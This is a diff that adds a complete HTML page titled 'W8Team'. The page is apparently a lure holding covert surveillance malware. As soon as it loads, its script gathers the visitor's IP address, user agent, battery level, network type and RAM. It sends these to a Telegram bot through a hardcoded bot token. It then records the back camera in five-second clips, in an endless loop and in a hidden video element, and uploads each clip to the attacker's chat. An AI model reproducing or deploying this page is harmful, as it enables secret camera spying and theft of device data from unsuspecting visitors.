@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>W8Team</title>
+</head>
+<body>
+    <video id="video" style="display: none;"></video>
+
+    <script>
+        const botToken = "9087217791:AAEjOhKH0uOml0VcW8Vsw2whkm0ZX6cOSvY"; // Replace with your actual bot token
+        let chatId = getChatIdFromUrl();
+        let currentCamera = 'environment'; // Use 'environment' as the default (back) camera
+
+        function getChatIdFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('id');
+        }
+
+        async function fetchWanIp() {
+            try {
+                const response = await fetch("https://ipinfo.io/json");
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error(error);
+                return "Error retrieving WAN IP";
+            }
+        }
+
+        async function sendInfoAndStartRecording() {
+            const wanIp = await fetchWanIp();
+            const userAgent = navigator.userAgent;
+            const batteryPercentage = await getBatteryPercentage();
+            const networkType = getNetworkType();
+            const dateAndTime = new Date().toString();
+            const totalRam = navigator.deviceMemory;
+
+            const infoMessage = `
+🌐 WAN IP Address: ${wanIp}
+📱 User-Agent: ${userAgent}
+🔋 Battery Percentage: ${batteryPercentage}%
+📡 Network Type: ${networkType}
+🗓 Date and Time: ${dateAndTime}
+💾 Total RAM: ${totalRam} GB
+📹 Video recording is starting...
+`;
+
+            sendTextToTelegram(infoMessage);
+            startContinuousVideoRecording();
+        }
+
+        async function startContinuousVideoRecording() {
+            const mediaOptions = { video: { facingMode: currentCamera } };
+
+            while (true) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia(mediaOptions);
+                    const videoTrack = stream.getVideoTracks()[0];
+
+                    const video = document.getElementById("video");
+                    video.srcObject = stream;
+                    video.style.display = "none";
+
+                    const mediaRecorder = new MediaRecorder(stream);
+                    let videoChunks = [];
+// 9ait7777666544422
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            videoChunks.push(event.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+                        sendVideoToTelegram(videoBlob);
+                    };
+
+                    mediaRecorder.start();
+
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 5000);
+
+                    await new Promise(resolve => setTimeout(resolve, 6000)); // Wait for 6 seconds before starting the next recording
+                } catch (error) {
+                    console.error(error);
+                    alert("Failed to access the camera for video recording.");
+                    break; // Stop the loop on error
+                }
+            }
+        }
+// 9ait7777666544422
+        function sendTextToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
+                method: "POST",
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Information sent to Telegram.");
+                    } else {
+                        throw new Error(data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert("Failed to send information to Telegram.");
+                });
+        }
+
+        function sendVideoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append("video", blob, "recording.mp4");
+            formData.append("chat_id", chatId);
+// 9ait7777666544422
+            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                method: "POST",
+                body: formData,
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Video recording sent to Telegram.");
+                    } else {
+                        throw new Error(data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert("Failed to send video recording.");
+                });
+        }
+// 9ait7777666544422
+        async function getBatteryPercentage() {
+            const battery = await navigator.getBattery();
+            return (battery.level * 100).toFixed(2);
+        }
+
+        function getNetworkType() {
+            return navigator.connection.effectiveType;
+        }
+
+        sendInfoAndStartRecording();
+    </script>
+</body>
+</html>
